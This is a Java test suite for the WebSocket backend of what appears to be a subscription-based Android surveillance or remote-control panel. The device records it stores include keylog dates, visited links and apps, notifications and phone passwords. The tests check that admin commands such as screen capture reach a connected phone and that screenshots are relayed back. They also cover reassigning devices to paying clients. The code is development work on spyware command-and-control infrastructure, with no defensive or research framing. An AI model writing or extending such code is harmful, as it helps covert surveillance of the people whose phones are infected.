package com.mm.backend;

import java.net.URI;
import java.time.Duration;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.TimeUnit;

import com.fasterxml.jackson.core.type.TypeReference;
import com.fasterxml.jackson.databind.ObjectMapper;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.test.web.server.LocalServerPort;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.web.socket.CloseStatus;
import org.springframework.web.socket.TextMessage;
import org.springframework.web.socket.WebSocketHttpHeaders;
import org.springframework.web.socket.WebSocketSession;
import org.springframework.web.socket.client.standard.StandardWebSocketClient;
import org.springframework.web.socket.handler.TextWebSocketHandler;

import static org.assertj.core.api.Assertions.assertThat;

@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
@ActiveProfiles("test")
class PanelWebSocketTests {

    @LocalServerPort
    int port;

    @Autowired
    JdbcTemplate jdbc;

    @Autowired
    ObjectMapper mapper;

    private static final TypeReference<Map<String, Object>> JSON_MAP = new TypeReference<>() {};
    private final BCryptPasswordEncoder encoder = new BCryptPasswordEncoder();

    @BeforeEach
    void resetData() {
        jdbc.update("DELETE FROM phones");
        jdbc.update("DELETE FROM users");
        jdbc.update("""
            INSERT INTO users (userid, usrname, profilepic, email, password, Expire, subtype,
              token, token_expiration, authorty, hidden)
            VALUES (?, ?, '', ?, ?, '2030-12-31', '12 Month', ?, ?, ?, 0)
            """,
            1, "admin", "admin@example.test",
            encoder.encode("admin-pass"),
            sha256("admin-token-123"),
            java.sql.Timestamp.valueOf(java.time.LocalDateTime.now().plusDays(7)),
            "admin"
        );
    }

    @Test
    void adminWithValidTokenGetsStatusBatchForOfflinePhone() throws Exception {
        try (Client admin = connect("admin-token-123")) {
            admin.send(Map.of("itype", "slr_panel", "subc", "ping", "pid", "no-such-phone"));
            Map<String, Object> reply = admin.next();
            assertThat(reply.get("type")).isEqualTo("statusBatch");
            assertThat(reply.get("pid")).isEqualTo("no-such-phone");
            assertThat(reply.get("serverToPhone")).isEqualTo("CLOSED");
        }
    }

    @Test
    void missingOrInvalidTokenClosesConnection() throws Exception {
        try (Client bad = connect("not-a-token")) {
            bad.send(Map.of("itype", "slr_panel", "subc", "ping", "pid", "x"));
            Map<String, Object> reply = bad.next();
            assertThat(reply.get("type")).isEqualTo("error");
            assertThat(reply.get("msg")).isEqualTo("unauthorized");
        }
    }

    @Test
    void blockedSubcommandIsRejected() throws Exception {
        try (Client admin = connect("admin-token-123")) {
            admin.send(Map.of("itype", "slr_panelsend", "subc", "Delete", "pid", "some-phone"));
            Map<String, Object> reply = admin.next();
            assertThat(reply.get("type")).isEqualTo("error");
            assertThat(reply.get("msg")).isEqualTo("command_denied");
        }
    }

    @Test
    void legacyCheckphoneReturnsLiveDeviceStatus() throws Exception {
        try (Client admin = connect("admin-token-123");
             Client device = connect("test-ws-device-key")) {
            device.send(new LinkedHashMap<>(Map.ofEntries(
                Map.entry("itype", "Slr_client"),
                Map.entry("phone_id", "phone-1"),
                Map.entry("usrname", "admin"),
                Map.entry("phone_name", "测试设备"),
                Map.entry("country", "CN"),
                Map.entry("model", "Pixel"),
                Map.entry("android_ver", "14"),
                Map.entry("accessibility", "1"),
                Map.entry("battery_charg", "88"),
                Map.entry("subc", "ping")
            )));
            Map<String, Object> reply = device.next();
            assertThat(reply.get("type")).isEqualTo("pong");

            admin.send(Map.of("itype", "slr_panel", "subc", "checkphone",
                "phone_name", "测试"));
            Map<String, Object> list = admin.next();
            assertThat(list.get("type")).isEqualTo("checkphone");
            assertThat(list.get("total")).isEqualTo(1);
            // Original Node.js uses "list" key; support both for backward compatibility
            @SuppressWarnings("unchecked")
            java.util.List<Object> rows = (java.util.List<Object>) list.get("list");
            if (rows == null) rows = (java.util.List<Object>) list.get("data");
            assertThat(rows)
                .singleElement()
                .satisfies((row) -> {
                    assertThat(row).asInstanceOf(org.assertj.core.api.InstanceOfAssertFactories.MAP)
                        .containsEntry("phone_id", "phone-1")
                        .containsEntry("phone_name", "测试设备")
                        .containsEntry("serverToPhone", "OPEN");
                });
        }
    }

    @Test
    void legacyReassignUsesCurrentAdminAndUpdatesDeviceOwner() throws Exception {
        jdbc.update("""
            INSERT INTO users (userid, usrname, profilepic, email, password, Expire, subtype,
              token, token_expiration, authorty, hidden)
            VALUES (?, ?, '', ?, ?, '2030-12-31', '12 Month', NULL, NULL, ?, 0)
            """,
            2, "client1", "client1@example.test",
            encoder.encode("client-pass"),
            "clients"
        );
        jdbc.update("""
            INSERT INTO phones (phone_id, usrname, phone_name, country, address, android_ver, model,
              phonepassword, phonenumber, wallpaper, battery_charg, network, install_date, last_ping,
              keylogs_dates, visited_links, visited_apps, notifications, activities, phone_options,
              accessibility)
            VALUES ('phone-1', 'admin', 'Old', 'CN', '127.0.0.1', '14', 'Pixel',
              '', '', '', '88', 'wifi', '2026-05-25', CURRENT_TIMESTAMP,
              '', '', '', '', '', '', '1')
            """);

        try (Client admin = connect("admin-token-123")) {
            admin.send(Map.of("itype", "slr_panel", "subc", "reassign",
                "pid", "phone-1", "new_email", "client1@example.test"));
            Map<String, Object> reply = admin.next();
            assertThat(reply.get("type")).isEqualTo("reassign");
            assertThat(reply.get("status")).isEqualTo("success");
            assertThat(reply.get("email")).isEqualTo("client1@example.test");
        }

        String owner = jdbc.queryForObject(
            "SELECT usrname FROM phones WHERE phone_id = 'phone-1'",
            String.class);
        assertThat(owner).isEqualTo("client1");
    }

    @Test
    void adminCommandIsForwardedToDeviceAndDeviceResponseRelayed() throws Exception {
        try (Client admin = connect("admin-token-123");
             Client device = connect("test-ws-device-key")) {

            // Device announces itself.
            device.send(Map.of("itype", "Slr_client", "phone_id", "phone-X", "subc", "ping"));
            Map<String, Object> pong = device.next();
            assertThat(pong.get("type")).isEqualTo("pong");

            // Admin joins room.
            admin.send(Map.of("itype", "slr_panel", "subc", "join", "pid", "phone-X"));
            // No response expected for join — verify by sending a query that *should* respond.
            admin.send(Map.of("itype", "slr_panel", "subc", "ping", "pid", "phone-X"));
            Map<String, Object> status = admin.next();
            assertThat(status.get("serverToPhone")).isEqualTo("OPEN");

            // Admin issues a screen request.
            admin.send(Map.of("itype", "slr_panelsend", "subc", "screen", "pid", "phone-X"));
            Map<String, Object> forwarded = device.next();
            assertThat(forwarded.get("itype")).isEqualTo("slr_panelsend");
            assertThat(forwarded.get("subc")).isEqualTo("screen");
            assertThat(forwarded.get("pid")).isEqualTo("phone-X");
            assertThat(forwarded).doesNotContainKey("authToken");
            assertThat(forwarded).doesNotContainKey("token");

            // Device replies with a screenshot URL — relayed to admins watching phone-X.
            device.send(Map.of("itype", "Slr_client", "phone_id", "phone-X",
                "subc", "screen", "url", "https://example.test/snap.jpg"));
            Map<String, Object> relay = admin.next();
            assertThat(relay.get("type")).isEqualTo("screen");
            assertThat(relay.get("pid")).isEqualTo("phone-X");
            // URL is forwarded as extra field by convertDeviceEvent
            assertThat(relay.get("url")).isEqualTo("https://example.test/snap.jpg");
        }
    }

    @Test
    void deviceTokenCannotImpersonateAdmin() throws Exception {
        try (Client impersonator = connect("test-ws-device-key")) {
            // Connect as device token but try to use admin channel.
            impersonator.send(Map.of("itype", "slr_panel", "subc", "ping", "pid", "x"));
            Map<String, Object> reply = impersonator.next();
            assertThat(reply.get("type")).isEqualTo("error");
            assertThat(reply.get("msg")).isEqualTo("unauthorized");
        }
    }

    private Client connect(String token) throws Exception {
        return new Client(URI.create("ws://localhost:" + port + "/api/ws/?authToken=" + token));
    }

    private final class Client implements AutoCloseable {
        private final BlockingQueue<Map<String, Object>> inbox = new ArrayBlockingQueue<>(16);
        private final WebSocketSession session;

        Client(URI uri) throws Exception {
            StandardWebSocketClient client = new StandardWebSocketClient();
            session = client.execute(new TextWebSocketHandler() {
                @Override
                protected void handleTextMessage(WebSocketSession s, TextMessage message) throws Exception {
                    inbox.offer(mapper.readValue(message.getPayload(), JSON_MAP));
                }
            }, new WebSocketHttpHeaders(), uri).get(5, TimeUnit.SECONDS);
        }

        void send(Map<String, Object> payload) throws Exception {
            session.sendMessage(new TextMessage(mapper.writeValueAsString(new LinkedHashMap<>(payload))));
        }

        Map<String, Object> next() throws InterruptedException {
            Map<String, Object> reply = inbox.poll(5, TimeUnit.SECONDS);
            assertThat(reply).as("expected a message within 5s").isNotNull();
            return reply;
        }

        @Override
        public void close() {
            try { session.close(CloseStatus.NORMAL); } catch (Exception ignored) {}
        }
    }

    private static String sha256(String value) {
        try {
            byte[] hash = java.security.MessageDigest.getInstance("SHA-256")
                .digest(value.getBytes(java.nio.charset.StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder(hash.length * 2);
            for (byte b : hash) sb.append(String.format("%02x", b));
            return sb.toString();
        } catch (Exception ex) { throw new RuntimeException(ex); }
    }

    @SuppressWarnings("unused")
    private static Duration ttl() { return Duration.ofSeconds(5); }
}
